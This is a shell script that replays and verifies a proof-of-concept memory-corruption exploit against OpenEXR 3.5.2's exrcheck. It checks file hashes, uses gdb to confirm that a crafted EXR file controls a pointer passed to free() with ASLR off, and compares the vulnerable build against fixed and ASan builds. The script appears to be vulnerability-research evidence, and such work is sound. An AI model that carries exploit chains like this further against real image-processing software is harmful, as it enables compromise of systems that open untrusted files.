#!/bin/sh
# W196: one-command replay.  In the UNMODIFIED pinned 3.5.2 exrcheck -c,
# with ASLR OFF in the debuggee, eight file-chosen bytes write a fake
# exr_attribute_t into COPY2's window.  The consumer dereferences that
# chosen pointer, reads a file-chosen EXR_ATTR_STRING type, and passes a
# second file-chosen pointer to free() at string.c:271.  Rung-4 mechanics:
# ASLR-off lab condition, no chosen IP, no command, no wire, no witness.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'cases/p196-fake-attr.exr 07eac4278b3890cdbaf27719c3b448f28c45236c1f7c8e39272820d7190cad13' \
    'cases/w195-pre-copy2-dump.bin f7c32f6ad820de0532396426d0ad9a8aa58440071636b03e1592cf766daffdc0' \
    'cases/make_w196_poc.py 0e27ef90182d37b9c39b6a76d40615c1658a63e5af5f07d0ba94e64e77dfe38c' \
    'harness/w196-attr-probe.cmd bb0bbfd1d5e1a5978f795a20a24fe17080d80574ecabe788532c0f439859fdae' \
    'harness/w196-free.cmd 445bf79f0300bc38da42912bf3b080693967f99070a35dd21a1cdee7559e1db6'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

gdb -q -batch -ex 'set args -c cases/p196-fake-attr.exr' \
    -x harness/w196-attr-probe.cmd ./build-vuln-plain/bin/exrcheck \
    > "$RAW" 2>&1 || true
grep -q '^ATTR=0x555555828520 TYPE=20 STRPTR=0x555555828560$' "$RAW"
grep -q '^S=0x555555828560 STR=0x555555828590 ALLOC=1 LEN=90$' "$RAW"
grep -q '^0x555555828590:.*0x5a5a5a5a5a5a5a5a' "$RAW"
grep -q 'mov    0x8(%rsi),%rdi' "$RAW"
{
    echo 'ASLR=off'
    grep -o 'ATTR=0x[0-9a-f]* TYPE=20 STRPTR=0x[0-9a-f]*' "$RAW"
    grep -o 'S=0x[0-9a-f]* STR=0x[0-9a-f]* ALLOC=1 LEN=90' "$RAW"
    grep -o '0x555555828590:.*0x5a5a5a5a5a5a5a5a' "$RAW"
    grep -o 'mov    0x8(%rsi),%rdi' "$RAW"
} > evidence/w196-attr.out

gdb -q -batch -ex 'set args -c cases/p196-fake-attr.exr' \
    -x harness/w196-free.cmd ./build-vuln-plain/bin/exrcheck \
    > "$RAW" 2>&1 || true
grep -q '^FREE_RDI=0x555555828590$' "$RAW"
grep -q 'mem=0x555555828590' "$RAW"
{
    grep -o 'ATTR=0x[0-9a-f]* TYPE=20 STRPTR=0x[0-9a-f]*' "$RAW"
    grep -o 'mem=0x555555828590' "$RAW"
    grep -o 'FREE_RDI=0x555555828590' "$RAW"
    grep -o '0x555555828580:.*0x0000000000000091' "$RAW"
} > evidence/w196-free.out

set +e
./build-vuln-plain/bin/exrcheck -c cases/p196-fake-attr.exr \
    > evidence/w196-plain.out 2>&1
plain_rc=$?
./build-vuln-plain/bin/exrcheck -c cases/baseline.exr \
    > evidence/w196-valid.out 2>&1
valid_rc=$?
./build-fixed-plain/bin/exrcheck -c cases/p196-fake-attr.exr \
    > evidence/w196-fixed.out 2>&1
fixed_rc=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c cases/p196-fake-attr.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
[ "$plain_rc" -eq 139 ]
[ "$valid_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
[ "$asan_rc" -eq 1 ]
grep -q 'OK' evidence/w196-valid.out
grep -q 'bad' evidence/w196-fixed.out
awk '
    { gsub(/==[0-9]+==/, "==PID==") }
    { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
    { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
    { print }
' < "$RAW" > evidence/w196-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w196-asan.out
grep -q 'READ of size 3072' evidence/w196-asan.out
grep -q 'internal_zstd.c:472' evidence/w196-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/w196-*.out
